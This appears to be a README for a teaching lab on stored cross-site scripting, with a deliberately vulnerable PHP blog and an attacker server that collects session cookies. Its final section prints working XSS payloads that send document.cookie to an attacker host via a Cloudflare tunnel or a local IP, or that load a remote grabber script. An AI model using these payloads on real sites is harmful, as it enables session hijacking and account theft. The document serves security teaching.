<h1>Cross-Site Scripting (XSS) - Lab</h1>

Build the following lab to demonstrate a stored XSS-Attack:

- VM 1, LAMP-Stack with blog-platform (vulnerable blog)
- VM/Host for Cookie Stealing (see cookie stealer or Cross-Site Scripting/flask_cookie_grabber.py)
- Enable web-facing session hijacking with cloudflare tunnel (see how-to)

![XSS_Hosts](https://github.com/user-attachments/assets/d3e3f1ab-3312-47fa-bf03-6a66117756c3)

<b>Vulnerable target's file structure:</b>

<pre>
htm/
└── blog/
    ├── authenticate.php    --> check credentials
    ├── index.php           --> home page, requires login
    ├── login.html          --> Login-Page to POST credentials
    ├── posts.json          --> Database for Blogposts
    ├── save_post.php       --> writes a blogpost into posts.json 
    └── styles.css          --> CSS
</pre>
⚠️ Change the owner of the blog-directory recursively to www-data
<pre>sudo chown www-data:www-data -R blog</pre>
<b>Attacker's Apache-Server file structure:</b>
<pre>
html/
├── Cookies.txt           --> cookie-database with timestamps 
├── grabber.js            --> Receives cookie after XSS-execution and forwards it to saver.php
└── saver.php             --> Generates timestamp, saves cookie to txt-File
</pre>


<b>Alternative attacker server</b>
Flask server to save cookies temporarely (see flask_cookie_grabber.py).
1. Download and run flask cookie grabber (i.e. in VS Code)
2. Open web browser
3. Got to http://localhost:8080
4. Successful transmitted cookies appear with time stamp (page refresh needed)

<h2>Stealing the cookie</h2>
In order to transmit the cookie to the attacker's server, you need to create a payload via stored XSS. It's task is to execute a remote script, which then receives the cookie.
<img width="1395" height="735" alt="image" src="https://github.com/user-attachments/assets/d6a4f818-cfed-4f31-a270-ed72e7d12223" />

<ol>
  <li>Open the blog website. Insert XSS into the vulnerable text box. Start stealer-server</li>
  <li>Post the XSS-code</li>
  <li>As soon as victim authenticates and blog entries are loaded, the script is executed in it's browser, loading the remote cookie stealer</li>
  <li>Cookie stealer saves the cookie and adds a timestamp. The session can be hijacked, as lang as it is established</li>
</ol>

<h3>Over web with Flask + Cloudflare Tunnel + https:</h3>
<pre><script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script></pre>

<h3>Within the Network with Flask:</h3>
<pre><script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script></pre>
Example: <br>
<pre><script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script></pre>

<h3>Within the network with apache "C2"-Server:</h3>
<pre><script src="http://[IP]/cookiegrabber/grabber.js"></script></pre>



